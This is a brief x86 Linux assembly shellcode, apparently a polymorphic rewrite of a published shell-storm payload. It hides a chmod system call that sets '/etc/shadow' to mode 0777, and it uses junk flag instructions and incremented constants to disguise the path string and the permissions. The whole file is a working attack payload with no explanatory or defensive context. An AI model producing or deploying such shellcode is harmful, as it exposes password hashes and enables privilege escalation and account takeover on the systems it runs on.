; Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-590.php

global _start

_start:

std
xor eax, eax
push eax
cdq
mov al, 0xf

mov esi, 0x776f6460
nop
inc esi

mov edi, 0x68732f62
inc edi
clc

mov edx, 0x74652f2e
inc edx
cmc

push esi
push edi
stc
push edx

mov ebx, esp
mov cx, 0x1fe
inc ecx
cmc
int  0x80
